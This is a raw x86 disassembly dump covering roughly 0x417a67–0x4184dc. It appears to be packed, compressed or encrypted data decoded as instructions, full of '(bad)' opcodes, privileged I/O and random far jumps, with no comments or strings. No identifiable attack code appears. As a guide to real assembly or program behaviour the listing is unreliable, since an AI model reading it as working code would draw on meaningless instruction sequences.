  417a67:	cmp    eax,0x493a80ad
  417a6c:	js     0x4179f1
  417a6e:	push   cs
  417a6f:	dec    ebx
  417a70:	inc    ecx
  417a71:	enter  0x82db,0xc3
  417a75:	mov    dh,0xd7
  417a77:	leave  
  417a78:	jg     0x417a08
  417a7a:	pop    ds
  417a7b:	push   esp
  417a7c:	add    eax,0x63687b37
  417a81:	mov    ch,0x6f
  417a83:	cwde   
  417a84:	and    DWORD PTR [edi-0x52cccbeb],ebp
  417a8a:	adc    DWORD PTR [eax-0xe1ba2a4],edx
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x210921a9]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	mov    BYTE PTR [esi+0xd19bc1b],dl
  417b12:	dec    edx
  417b13:	scas   eax,DWORD PTR es:[edi]
  417b14:	int    0xfa
  417b16:	and    esi,DWORD PTR [edi]
  417b18:	pop    edi
  417b19:	mov    esp,0x4d960807
  417b1e:	cmp    BYTE PTR [esi],ah
  417b20:	loopne 0x417aaa
  417b22:	push   esp
  417b23:	jmp    0x417b9e
  417b25:	or     al,0xcb
  417b27:	adc    eax,0xc4c0c297
  417b2c:	pop    edi
  417b2d:	mov    ah,0x63
  417b2f:	in     al,0xc3
  417b31:	push   edx
  417b32:	fbstp  TBYTE PTR [edi+0x2a]
  417b35:	xor    eax,0x4699a3cd
  417b3a:	inc    esi
  417b3b:	push   es
  417b3c:	mov    BYTE PTR [edx-0x749302dc],dl
  417b42:	adc    al,0x6a
  417b44:	inc    esp
  417b45:	arpl   WORD PTR [ecx+0x5d],dx
  417b48:	mov    ecx,ebp
  417b4a:	dec    eax
  417b4b:	inc    ecx
  417b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b4d:	ins    BYTE PTR es:[edi],dx
  417b4e:	mov    esp,0xa4827fa
  417b53:	mov    ebp,0x4d983aaa
  417b58:	add    BYTE PTR [esi],0xd1
  417b5b:	jmp    0x30b8:0xd7f61ac5
  417b62:	imul   ebp,DWORD PTR [esp+ebp*1],0x57
  417b66:	pop    es
  417b67:	(bad)  
  417b69:	std    
  417b6a:	shl    DWORD PTR [edi-0x6d],1
  417b6d:	and    ecx,DWORD PTR [ebp+0x6d]
  417b70:	stc    
  417b71:	mov    ah,0x5e
  417b73:	mov    bh,0x45
  417b75:	mov    ebp,ecx
  417b77:	jmp    0x417bd2
  417b79:	or     dh,BYTE PTR [esi]
  417b7b:	mov    dh,0x23
  417b7d:	pusha  
  417b7e:	or     eax,0x92a9afad
  417b83:	(bad)  
  417b85:	dec    ebp
  417b86:	call   0x8c7bd85e
  417b8b:	push   0x54335293
  417b90:	xor    al,0xf4
  417b92:	pop    eax
  417b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b94:	push   esi
  417b95:	and    BYTE PTR [edi-0x4c],ch
  417b98:	fnstcw WORD PTR [ebp-0x4b]
  417b9b:	mov    ds:0x176c3473,al
  417ba0:	inc    esp
  417ba1:	sub    bh,bh
  417ba3:	sbb    ah,BYTE PTR [eax]
  417ba5:	(bad)  
  417ba6:	in     eax,dx
  417ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba8:	fmul   QWORD PTR [esi-0x32]
  417bab:	enter  0x24f3,0xad
  417baf:	jne    0x417b45
  417bb1:	psubusb mm0,QWORD PTR [esi+0x7bcb8ed5]
  417bb8:	inc    edx
  417bb9:	or     al,0xbf
  417bbb:	cld    
  417bbc:	mov    WORD PTR [ebx-0x47],?
  417bbf:	or     eax,0xdc15db15
  417bc4:	inc    ebx
  417bc5:	call   0xbbcd4854
  417bca:	jle    0x417b6e
  417bcc:	jb     0x417c4d
  417bce:	adc    eax,0x95e310cc
  417bd3:	push   ss
  417bd4:	mov    ebp,cs
  417bd6:	mov    dh,0x1c
  417bd8:	mov    ah,0xdd
  417bda:	cdq    
  417bdb:	xor    BYTE PTR [ecx+ebx*2+0x31],0x19
  417be0:	inc    edi
  417be1:	call   0x4c33:0x3ac1949e
  417be8:	aas    
  417be9:	mov    ecx,0x6e2d3488
  417bee:	bound  ecx,QWORD PTR [ebx+0xe2bfff1]
  417bf4:	cmp    DWORD PTR [esi-0x890dc9d],0x5f157dc2
  417bfe:	or     ah,bh
  417c00:	es dec ebp
  417c02:	jns    0x417bdc
  417c04:	ins    DWORD PTR es:[edi],dx
  417c05:	cmp    eax,0x3957a1c6
  417c0a:	in     eax,dx
  417c0b:	pop    esp
  417c0c:	sub    ecx,ebp
  417c0e:	in     al,0x6a
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x82
  417c81:	sbb    ecx,DWORD PTR [edi]
  417c83:	mov    dl,0x80
  417c85:	sti    
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    al,0x1
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	push   ecx
  417c8d:	xchg   edx,eax
  417c8e:	test   BYTE PTR [ecx+ebx*4-0x68],ah
  417c92:	daa    
  417c93:	call   0x7bdac8a5
  417c98:	mov    esi,0xb79640de
  417c9d:	mov    bl,0x2
  417c9f:	inc    ebx
  417ca0:	sub    DWORD PTR [ecx+0x4b],edi
  417ca3:	cs and eax,0x6bdecfdb
  417ca9:	rol    BYTE PTR [ecx],1
  417cab:	fstp   DWORD PTR [esi]
  417cad:	aam    0x24
  417caf:	mov    ds:0xa2910be0,eax
  417cb4:	das    
  417cb5:	or     edi,0x5
  417cb8:	mov    ecx,DWORD PTR [ebx-0x5e]
  417cbb:	fucomip st,st(1)
  417cbd:	and    DWORD PTR [ecx+0x4643dc74],0xb2c4a2ef
  417cc7:	dec    esp
  417cc8:	and    al,0xce
  417cca:	pop    esi
  417ccb:	jle    0x417d2f
  417ccd:	fldln2 
  417ccf:	ret    0x25d8
  417cd2:	js     0x417c74
  417cd4:	scas   al,BYTE PTR es:[edi]
  417cd5:	inc    ebx
  417cd6:	(bad)  
  417cd7:	push   ds
  417cd8:	lods   al,BYTE PTR ds:[esi]
  417cd9:	enter  0x794f,0xde
  417cdd:	fldcw  WORD PTR [edi-0x99007a0]
  417ce3:	pop    es
  417ce4:	gs call 0x5329:0xadf72fea
  417cec:	mov    cl,0x6b
  417cee:	xchg   esi,eax
  417cef:	or     edi,esp
  417cf1:	aas    
  417cf2:	stos   DWORD PTR es:[edi],eax
  417cf3:	shl    BYTE PTR [edi+ecx*8-0x34df0077],1
  417cfa:	xlat   BYTE PTR ds:[ebx]
  417cfb:	das    
  417cfc:	mov    BYTE PTR [ecx+0x34],bh
  417cff:	cmc    
  417d00:	dec    esi
  417d01:	jmp    0x417cfe
  417d03:	jb     0x417cc2
  417d05:	adc    DWORD PTR [edx+edx*8+0x67415b81],esi
  417d0c:	pop    es
  417d0d:	fnstcw WORD PTR [eax]
  417d0f:	std    
  417d10:	inc    ebp
  417d11:	pop    ebp
  417d12:	arpl   WORD PTR [ebp+0x5d],cx
  417d15:	add    esp,edi
  417d17:	pop    ds
  417d18:	xchg   DWORD PTR [ecx+ebx*8],eax
  417d1b:	dec    esp
  417d1c:	inc    ecx
  417d1d:	cmp    ah,BYTE PTR [edi]
  417d1f:	add    ebp,DWORD PTR [ebx]
  417d21:	ja     0x417d17
  417d23:	push   ds
  417d24:	ret    0x8a9e
  417d27:	frstor [edx]
  417d29:	jge    0x417d96
  417d2b:	push   es
  417d2c:	inc    ebx
  417d2d:	ds add al,0xcf
  417d30:	pop    edx
  417d31:	mov    ch,0x22
  417d33:	shl    BYTE PTR [edx],0xf5
  417d36:	pop    edi
  417d37:	pop    edx
  417d38:	retf   
  417d39:	fdivr  st,st(5)
  417d3b:	jecxz  0x417d64
  417d3d:	and    dh,BYTE PTR [ecx+0x2482fc9e]
  417d43:	cmp    ecx,ebp
  417d45:	stos   BYTE PTR es:[edi],al
  417d46:	push   esi
  417d47:	repz and ah,bh
  417d4a:	mov    al,ds:0x9d602640
  417d4f:	fadd   DWORD PTR [esi+0x20]
  417d52:	div    DWORD PTR [ebx]
  417d54:	adc    BYTE PTR [eax+0xf93739f],bl
  417d5a:	inc    ebp
  417d5b:	in     al,0x8e
  417d5d:	sub    al,0x69
  417d5f:	in     al,0xff
  417d61:	xchg   esi,eax
  417d62:	in     eax,dx
  417d63:	fidiv  DWORD PTR [ecx+0x2c]
  417d66:	in     eax,dx
  417d67:	jecxz  0x417d3a
  417d69:	nop
  417d6a:	dec    ecx
  417d6b:	mov    al,0x7a
  417d6d:	jno    0x417d4a
  417d6f:	icebp  
  417d70:	jle    0x417dba
  417d72:	xor    ecx,DWORD PTR [eax]
  417d74:	add    edx,ebx
  417d76:	push   edx
  417d77:	inc    esi
  417d78:	(bad)  
  417d79:	mov    edx,0xfdd72fb2
  417d7e:	adc    al,0x65
  417d80:	or     BYTE PTR ds:0x2c618876,dl
  417d86:	mov    al,ds:0x44db406b
  417d8b:	test   esi,edi
  417d8d:	clc    
  417d8e:	outs   dx,BYTE PTR ds:[esi]
  417d8f:	lock add BYTE PTR [eax],al
	...
  417df2:	add    BYTE PTR [eax],al
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	add    al,0xe7
  417e02:	adc    BYTE PTR [edi-0x7c],0xfc
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	add    BYTE PTR [esi+0x453ef0e],ch
  417e12:	mov    ch,0xd5
  417e14:	pop    DWORD PTR [esi-0xde55b1c]
  417e1a:	sub    ch,BYTE PTR [esi-0x13]
  417e1d:	fcomp  QWORD PTR ds:0xd9059026
  417e23:	test   DWORD PTR [edi+0x50],0x1843e963
  417e2a:	jbe    0x417e50
  417e2c:	push   ds
  417e2d:	mov    esp,0xcc4c09bd
  417e32:	xchg   edx,eax
  417e33:	xchg   edi,eax
  417e34:	xchg   DWORD PTR [edi+0x18613c9c],ebp
  417e3a:	dec    edi
  417e3b:	mov    esi,0x37b5cca3
  417e40:	imul   ecx,DWORD PTR [edx-0x1e44dab5],0x2c0dbb19
  417e4a:	pop    esp
  417e4b:	dec    ebp
  417e4c:	(bad)  
  417e4d:	mov    cl,0xbf
  417e4f:	ficom  WORD PTR [ebx+0x7c4ba613]
  417e55:	push   0x88405f12
  417e5a:	aaa    
  417e5b:	mov    bl,BYTE PTR [edx]
  417e5d:	jge    0x417e5e
  417e5f:	inc    edi
  417e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e61:	sub    dl,BYTE PTR [edi-0x60]
  417e64:	imul   ecx,DWORD PTR [eax],0xffffffc0
  417e67:	imul   esp,eax,0xf9b91934
  417e6d:	fprem  
  417e6f:	out    0x62,al
  417e71:	jb     0x417e8d
  417e73:	adc    eax,0xf3f06419
  417e78:	out    dx,eax
  417e79:	pop    ebp
  417e7a:	mov    edx,0x6fc43d0d
  417e7f:	sub    DWORD PTR [edi+ecx*4],edx
  417e82:	or     al,0xbb
  417e84:	sbb    esp,edi
  417e86:	jg     0x417e8c
  417e88:	jg     0x417e28
  417e8a:	add    al,0x46
  417e8c:	mov    ch,0xc3
  417e8e:	jb     0x417e3b
  417e90:	mov    ebx,0x9a529c57
  417e95:	mov    bh,0x13
  417e97:	fcom   DWORD PTR [ebx+edi*2+0x37edd085]
  417e9e:	nop
  417e9f:	(bad)  
  417ea0:	int3   
  417ea1:	mov    DWORD PTR [esi+0x5d],edx
  417ea4:	mov    ebx,0xfe8182b6
  417ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eaa:	jbe    0x417f05
  417eac:	dec    edx
  417ead:	imul   ebx,DWORD PTR [ebp+0x30518dce],0xe72379de
  417eb7:	ret    0x7411
  417eba:	mov    ds:0xc0a47a75,al
  417ebf:	stos   BYTE PTR es:[edi],al
  417ec0:	data16 fimul WORD PTR [ebx]
  417ec3:	cli    
  417ec4:	fld    QWORD PTR [edi-0x5a]
  417ec7:	pop    ecx
  417ec8:	push   ds
  417ec9:	mov    al,ds:0x4b0410d6
  417ece:	jle    0x417e74
  417ed0:	add    al,BYTE PTR [esi+esi*1-0x2f]
  417ed4:	and    eax,0xef15a12b
  417ed9:	ja     0x417f36
  417edb:	push   ecx
  417edc:	stos   DWORD PTR es:[edi],eax
  417edd:	push   cs
  417ede:	arpl   bp,bp
  417ee0:	gs pop eax
  417ee2:	test   al,0xa2
  417ee4:	mov    al,0xdf
  417ee6:	cmp    ah,BYTE PTR [ecx+edx*4-0x5cab0ee]
  417eed:	pop    esp
  417eee:	std    
  417eef:	(bad)  
  417ef0:	in     al,dx
  417ef1:	mov    ds:0xb44593fd,eax
  417ef6:	inc    ecx
  417ef7:	jmp    0x63d2:0x5dae5d88
  417efe:	mov    ds:0xdbd934c8,al
  417f03:	popa   
  417f04:	jmp    0x2548cd45
  417f09:	clc    
  417f0a:	mov    WORD PTR [ecx-0x79],ss
  417f0d:	and    DWORD PTR [esi],ebx
  417f0f:	aaa    
	...
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	inc    esp
  417f81:	clc    
  417f82:	mov    ss,WORD PTR [ebx-0x78]
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	sub    eax,0x9da19e10
  417f91:	jae    0x417f6c
  417f93:	sar    esp,1
  417f95:	outs   dx,BYTE PTR ds:[esi]
  417f96:	sar    BYTE PTR [edi+edi*8+0x75009c30],0x64
  417f9e:	mov    ds:0xefccb8ce,eax
  417fa3:	cli    
  417fa4:	stos   BYTE PTR es:[edi],al
  417fa5:	repz jns 0x418007
  417fa8:	ror    BYTE PTR [edx-0x6c0dc0f9],0x68
  417faf:	cmp    edx,eax
  417fb1:	and    BYTE PTR [esp+ebx*2+0x10d4090],ch
  417fb8:	stos   DWORD PTR es:[edi],eax
  417fb9:	sbb    DWORD PTR [ecx],edi
  417fbb:	cli    
  417fbc:	adc    BYTE PTR [esi-0x21],al
  417fbf:	xchg   esp,eax
  417fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fc1:	jg     0x417fa2
  417fc3:	test   al,0x49
  417fc5:	mov    bl,0x5e
  417fc7:	or     al,BYTE PTR [edx]
  417fc9:	mov    dl,0xc3
  417fcb:	xlat   BYTE PTR ds:[ebx]
  417fcc:	bound  ebp,QWORD PTR [ebp+eax*8+0x6edccbd5]
  417fd3:	popf   
  417fd4:	mov    esp,0x65c4809f
  417fd9:	xchg   BYTE PTR [edx],cl
  417fdb:	scas   al,BYTE PTR es:[edi]
  417fdc:	mov    BYTE PTR [edx],ah
  417fde:	lds    ebp,FWORD PTR [ebx+eiz*8]
  417fe1:	xchg   ecx,eax
  417fe2:	mov    edi,0x2ea72e12
  417fe7:	mov    BYTE PTR [eax-0x3],0x27
  417feb:	stos   DWORD PTR es:[edi],eax
  417fec:	retf   
  417fed:	mov    dl,0x2e
  417fef:	in     eax,dx
  417ff0:	pop    eax
  417ff1:	pop    ds
  417ff2:	fs call 0xc8879f8e
  417ff8:	cdq    
  417ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ffa:	push   0x4f
  417ffc:	pop    esi
  417ffd:	es ret 
  417fff:	loopne 0x417fa7
  418001:	jns    0x417fab
  418003:	jle    0x41804a
  418005:	mov    ebx,0xbbc0b590
  41800a:	data16 rcr BYTE PTR [ebx+0x415b6611],cl
  418011:	sbb    esp,ecx
  418013:	push   ecx
  418014:	sbb    eax,0xbfea6833
  418019:	lahf   
  41801a:	mov    ebx,0x34b9324c
  41801f:	div    BYTE PTR [edi-0x23]
  418022:	(bad)  [edi-0x3682425e]
  418028:	cmp    eax,DWORD PTR [eax]
  41802a:	retf   
  41802b:	(bad)  
  41802d:	fadd   DWORD PTR [ebx]
  41802f:	push   esi
  418030:	fild   QWORD PTR [edi-0x206ca235]
  418036:	enter  0x85c8,0xf6
  41803a:	(bad)  [eax]
  41803c:	imul   esi,ebp,0xffffffa7
  41803f:	mov    ebp,0x34c6b1d8
  418044:	mov    WORD PTR [edi+0x4178d3fb],ss
  41804a:	popf   
  41804b:	fstp   DWORD PTR [esi+eiz*1+0x74]
  41804f:	outs   dx,BYTE PTR ds:[esi]
  418050:	pop    ebx
  418051:	mov    WORD PTR fs:[edx-0x639f8e27],ss
  418058:	ds mov esi,0x42d1d970
  41805e:	loop   0x4180d2
  418060:	push   ebp
  418061:	mov    DWORD PTR [ebx],ebp
  418063:	mov    al,ds:0xa05f08a6
  418068:	push   es
  418069:	jne    0x418046
  41806b:	mov    bl,al
  41806d:	xchg   edx,eax
  41806e:	call   0x8951:0xc7c81dcf
  418075:	ds cwde 
  418077:	pop    edx
  418078:	sbb    eax,DWORD PTR [ecx-0x1bb9e42f]
  41807e:	jmp    0x41805c
  418080:	dec    ecx
  418081:	jb     0x41804f
  418083:	xor    DWORD PTR [esi+0x9],edx
  418086:	xchg   ebp,eax
  418087:	mov    eax,0xac2a0589
  41808c:	sub    al,0xea
  41808e:	repnz mov dl,0x0
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x9f2fdebc,eax
  418101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418102:	cs jns 0x418091
  418105:	inc    BYTE PTR [eax]
  418107:	add    BYTE PTR [ecx+eax*1],al
  41810a:	add    BYTE PTR [eax],al
  41810c:	adc    BYTE PTR [esi+0x77],dl
  41810f:	xor    ecx,ebx
  418111:	add    al,0xa9
  418113:	stos   DWORD PTR es:[edi],eax
  418114:	mov    bh,0x8d
  418116:	inc    esi
  418117:	pusha  
  418118:	add    al,0xc3
  41811a:	mov    ecx,DWORD PTR ds:0xdfb4c1b1
  418120:	push   ebx
  418121:	imul   esi,eax,0xfed92e18
  418127:	in     eax,0x6c
  418129:	cmp    edi,edi
  41812b:	sar    BYTE PTR [ecx-0x9da61d5],0xaa
  418132:	mov    ecx,0x8aaad818
  418137:	jg     0x418108
  418139:	into   
  41813a:	sbb    bh,BYTE PTR ds:0x5c113e3f
  418140:	mov    ah,0xea
  418142:	xor    eax,0x266928c9
  418147:	xchg   esp,eax
  418148:	test   BYTE PTR [edi],dl
  41814a:	pop    es
  41814b:	jg     0x418107
  41814d:	mov    ds:0x10392fbe,eax
  418152:	mov    ecx,0xf14f0167
  418157:	mov    edx,0x62aaacc3
  41815c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41815d:	or     eax,DWORD PTR [ecx-0x54]
  418160:	sub    dh,ah
  418162:	out    0xd4,al
  418164:	inc    edi
  418165:	jo     0x418199
  418167:	(bad)  
  418168:	(bad)
  41816b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41816c:	dec    esp
  41816d:	pop    ebx
  41816e:	psrad  mm2,QWORD PTR [edi]
  418171:	cmp    eax,0xf2b6f80f
  418176:	pop    ebp
  418177:	add    BYTE PTR [edx+0x3a],ch
  41817a:	add    BYTE PTR [esi+0x7aaeee42],al
  418180:	dec    edi
  418181:	aas    
  418182:	lods   eax,DWORD PTR ds:[esi]
  418183:	es mov cl,0x19
  418186:	jmp    0x4181a4
  418188:	sbb    BYTE PTR ds:0x5b70b253,dh
  41818e:	push   ds
  41818f:	mov    al,ds:0x8dea7ceb
  418194:	test   eax,0x8ded2442
  418199:	xor    BYTE PTR [eax+0x32],al
  41819c:	sti    
  41819d:	fdivr  DWORD PTR [edi-0x21]
  4181a0:	daa    
  4181a1:	ins    BYTE PTR es:[edi],dx
  4181a2:	pop    ebx
  4181a3:	xchg   esp,eax
  4181a4:	inc    ebx
  4181a5:	mov    WORD PTR [edi+0x2],gs
  4181a8:	adc    bh,BYTE PTR [eax]
  4181aa:	push   ds
  4181ab:	outs   dx,DWORD PTR ds:[esi]
  4181ac:	shl    dl,1
  4181ae:	(bad)  
  4181af:	mov    ds:0x6bcee22d,eax
  4181b4:	mov    ah,0x89
  4181b6:	xlat   BYTE PTR ds:[ebx]
  4181b7:	xor    BYTE PTR [ecx+0x63542c26],ch
  4181bd:	pop    ecx
  4181be:	lds    ebp,FWORD PTR [eax-0x2c]
  4181c1:	retf   
  4181c2:	loope  0x418219
  4181c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181c5:	xchg   DWORD PTR [edx-0x588ddb2],ebp
  4181cb:	inc    edi
  4181cc:	jne    0x418191
  4181ce:	cwde   
  4181cf:	or     DWORD PTR [esi-0x40c4ea40],edi
  4181d5:	pop    edx
  4181d6:	push   edi
  4181d7:	add    BYTE PTR [ebx+ebx*1-0x2c],ch
  4181db:	icebp  
  4181dc:	scas   al,BYTE PTR es:[edi]
  4181dd:	into   
  4181de:	cli    
  4181df:	mov    ecx,0xc4dbbaab
  4181e4:	loop   0x418176
  4181e6:	mov    eax,DWORD PTR [edi-0x47]
  4181e9:	mov    edx,0x94901e0a
  4181ee:	rcl    DWORD PTR [esi+ebx*1+0x74],cl
  4181f2:	(bad)  
  4181f4:	inc    ecx
  4181f5:	cdq    
  4181f6:	mov    gs,esp
  4181f8:	ret    
  4181f9:	repnz ds aad 0xd4
  4181fd:	xchg   esp,eax
  4181fe:	cmp    eax,0xe151a34a
  418203:	into   
  418204:	lods   eax,DWORD PTR ds:[esi]
  418205:	mov    bh,0x83
  418207:	scas   al,BYTE PTR es:[edi]
  418208:	repnz push edi
  41820a:	ss loope 0x418191
  41820d:	and    eax,0xc24f
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xf4bb8d6
  418282:	pop    ss
  418283:	jmp    0x104:0xff90
  41828a:	add    BYTE PTR [eax],al
  41828c:	cmp    dl,BYTE PTR [ebx+0x116f2010]
  418292:	hlt    
  418293:	mov    edi,0xa4125b1e
  418298:	out    0x89,al
  41829a:	(bad)  
  41829b:	mov    ds:0xfbb485d8,al
  4182a0:	jge    0x418317
  4182a2:	sub    cl,dl
  4182a4:	adc    eax,0xba606033
  4182a9:	ja     0x4182ad
  4182ab:	mov    WORD PTR [edi],ds
  4182ad:	jb     0x418304
  4182af:	jp     0x41830c
  4182b1:	jle    0x41824d
  4182b3:	push   es
  4182b4:	xchg   esp,eax
  4182b5:	xor    BYTE PTR [ebp-0x55],bh
  4182b8:	bound  ebx,QWORD PTR [esi-0x4c90a38d]
  4182be:	scas   eax,DWORD PTR es:[edi]
  4182bf:	daa    
  4182c0:	dec    ebx
  4182c1:	add    ebp,DWORD PTR [eax+0x6ea48d40]
  4182c7:	push   edx
  4182c8:	les    ebp,FWORD PTR [ecx-0x55d47163]
  4182ce:	inc    ebx
  4182cf:	push   edx
  4182d0:	push   eax
  4182d1:	push   edi
  4182d2:	cmp    eax,0xdde11725
  4182d7:	inc    edi
  4182d8:	push   eax
  4182d9:	cli    
  4182da:	jp     0x418288
  4182dc:	sbb    esp,eax
  4182de:	je     0x41833a
  4182e0:	pop    ecx
  4182e1:	jnp    0x4182b8
  4182e3:	ret    0x7b02
  4182e6:	or     al,BYTE PTR [edx+0x1f]
  4182e9:	mov    ds:0x788ebf16,al
  4182ee:	and    BYTE PTR [ebp-0x55206e3f],ah
  4182f4:	pop    eax
  4182f5:	xor    al,0x51
  4182f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f8:	mov    edi,0x7780506b
  4182fd:	push   es
  4182fe:	retf   0x5336
  418301:	lock inc ebx
  418303:	push   0xc0b89c8
  418308:	inc    ecx
  418309:	adc    dl,cl
  41830b:	retf   0x164d
  41830e:	sbb    esi,ebx
  418310:	xchg   ecx,eax
  418311:	pop    edi
  418312:	add    al,0x5a
  418314:	call   0x83941d7
  418319:	inc    ebp
  41831a:	jo     0x4182a1
  41831c:	cmp    BYTE PTR [eax-0x4407a9c9],ch
  418322:	fs push edi
  418324:	adc    al,ah
  418326:	cdq    
  418327:	fwait
  418328:	xor    al,0xb6
  41832a:	(bad)  
  41832b:	pop    ebx
  41832c:	push   ss
  41832d:	lods   al,BYTE PTR ds:[esi]
  41832e:	inc    esi
  41832f:	add    al,ch
  418331:	or     edi,esi
  418333:	push   esi
  418334:	jns    0x4183b2
  418336:	shl    DWORD PTR [ecx-0x12a676b],0x23
  41833d:	adc    eax,0xd303052b
  418342:	bswap  esi
  418344:	les    edx,FWORD PTR [ecx-0x5c]
  418347:	mov    ah,BYTE PTR [esi-0x39ecea17]
  41834d:	dec    ebp
  41834e:	mov    ebp,ebp
  418350:	mov    eax,0x7c44483f
  418355:	clc    
  418356:	fs adc edx,esp
  418359:	leave  
  41835a:	(bad)  
  41835b:	outs   dx,BYTE PTR ds:[esi]
  41835c:	bound  eax,QWORD PTR [esi-0x6e]
  41835f:	push   edx
  418361:	ss xchg ecx,eax
  418363:	push   es
  418364:	cmp    DWORD PTR [esp+ebp*8+0x5a],ebx
  418368:	add    edi,DWORD PTR [esi]
  41836a:	sbb    dh,dl
  41836c:	push   ss
  41836d:	xor    BYTE PTR ss:[edi+0xf129437],ch
  418374:	mov    dl,0x7b
  418376:	push   esp
  418377:	mov    edx,0xb795738a
  41837c:	add    ah,ah
  41837e:	mov    eax,ds:0x9f0b08d5
  418383:	jne    0x418383
  418385:	je     0x41838a
  418387:	bnd jl 0x4183a5
  41838a:	les    ecx,FWORD PTR [ebx-0x586cef1e]
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	mov    WORD PTR [esi],?
  418402:	das    
  418403:	fst    DWORD PTR [eax+eax*1+0x1040001]
  41840a:	add    BYTE PTR [eax],al
  41840c:	test   eax,0x86661edd
  418411:	pop    eax
  418412:	inc    esp
  418413:	jmp    0x4183ec
  418415:	hlt    
  418416:	push   ecx
  418417:	cld    
  418418:	(bad)
  41841b:	push   edx
  41841c:	lds    eax,FWORD PTR [ecx-0x5e]
  41841f:	lahf   
  418420:	icebp  
  418421:	mov    ds:0xe39bb607,eax
  418426:	cs pop ds
  418428:	sub    cl,BYTE PTR [ebx+0xf3c5605]
  41842e:	jb     0x41844a
  418430:	jnp    0x418466
  418432:	(bad)  
  418433:	cwde   
  418434:	mov    bl,0x78
  418436:	add    al,0x2f
  418438:	test   al,0x65
  41843a:	jno    0x4183bd
  41843c:	aam    0xac
  41843e:	jo     0x4183f2
  418440:	xor    bh,BYTE PTR [eax+0x53]
  418443:	int3   
  418444:	xchg   ebx,eax
  418445:	sub    DWORD PTR [esi-0x7d1df3e8],esp
  41844b:	mov    bl,0xdf
  41844d:	push   0xffffffcd
  41844f:	jg     0x4184b7
  418451:	in     eax,dx
  418452:	push   es
  418453:	jne    0x4183e5
  418455:	inc    ebx
  418456:	call   0xd834220a
  41845b:	sub    DWORD PTR [edx-0x6d11fba6],edi
  418461:	in     eax,0x7f
  418463:	out    0x82,eax
  418465:	inc    edi
  418466:	in     al,dx
  418467:	push   0x310512d4
  41846c:	dec    esi
  41846d:	rcr    DWORD PTR [ebp+0xb],1
  418470:	xchg   edi,eax
  418471:	out    dx,al
  418472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418473:	scas   al,BYTE PTR es:[edi]
  418474:	out    0x7d,al
  418476:	outs   dx,DWORD PTR ds:[esi]
  418477:	mov    ecx,0x32f66508
  41847c:	loope  0x4184e0
  41847e:	xor    ebx,DWORD PTR [edx+edx*1-0x12]
  418482:	mov    edi,0x2e397a0f
  418487:	jnp    0x4184d3
  418489:	or     eax,0xf7f005a5
  41848e:	bound  esp,QWORD PTR [edx+0x780814a]
  418494:	jnp    0x41847c
  418496:	sub    ebp,esp
  418498:	push   cs
  418499:	pop    es
  41849a:	int    0xd8
  41849c:	fdivr  st(7),st
  41849e:	xor    al,0x82
  4184a0:	mov    ds:0xc4d753d5,eax
  4184a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a6:	call   0xef8c:0xd78d941e
  4184ad:	cmp    ebx,DWORD PTR ds:0xfd9ae448
  4184b3:	cdq    
  4184b4:	adc    BYTE PTR [ebp-0xa],bh
  4184b7:	sahf   
  4184b8:	pop    esp
  4184b9:	xchg   DWORD PTR ss:[esi+0x2ab1f5f8],ecx
  4184c0:	js     0x4184eb
  4184c2:	cli    
  4184c3:	sub    eax,0xec6d9f22
  4184c8:	cs jno 0x41852a
  4184cb:	dec    edi
  4184cc:	pop    edi
  4184cd:	sahf   
  4184ce:	cli    
  4184cf:	xchg   BYTE PTR [edx],dl
  4184d1:	push   ebp
  4184d2:	sub    BYTE PTR [ecx+0x6e],ch
  4184d5:	mov    bh,0x97
  4184d7:	out    0xd3,al
  4184d9:	ins    BYTE PTR es:[edi],dx
  4184da:	daa    
  4184db:	push   es
  4184dc:	outs   dx,BYTE PTR ds:[esi]
